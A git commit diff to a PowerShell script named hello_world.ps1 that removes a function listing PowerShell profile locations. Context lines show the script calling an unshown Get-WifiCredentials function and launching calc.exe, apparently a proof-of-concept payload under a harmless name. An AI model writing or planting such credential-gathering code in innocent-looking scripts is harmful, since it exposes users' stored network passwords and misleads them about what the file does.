6f90e5b658e03cb568d1f60b5cf1058b60d2f204
Ring0 <60684366+S3VzaHk@users.noreply.github.com>
2025-09-27 11:25:15 +0900

    Update hello_world.ps1

--- hello_world.ps1
+++ hello_world.ps1
@@ -16,33 +16,4 @@ function Get-WifiCredentials {
 }
 $credentials = Get-WifiCredentials
 
-function Get-PsProfileDetails {
-    try {
-        $profilePaths = @{
-            AllUsersAllHosts       = $PROFILE.AllUsersAllHosts
-            AllUsersCurrentHost    = $PROFILE.AllUsersCurrentHost
-            CurrentUserAllHosts    = $PROFILE.CurrentUserAllHosts
-            CurrentUserCurrentHost = $PROFILE.CurrentUserCurrentHost
-        }
-        $level = 1
-        $profiles = foreach ($key in $profilePaths.Keys) {
-            $location = $profilePaths[$key]
-            $existent = if (Test-Path $location) { "True" } else { "False" }
-            New-Object PSObject -Property @{
-                Level       = $level
-                Profile     = $key
-                Location    = $location
-                Existent    = $existent
-                ParentFolder = Split-Path $location -Parent
-            }
-            $level++
-        }
-        $profiles | Select-Object Profile, Level, Location, Existent, ParentFolder
-    } catch {
-        "⚠️ Error in line $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
-    }
-}
-
-$profiles = Get-PsProfileDetails
-
 Start-Process calc.exe
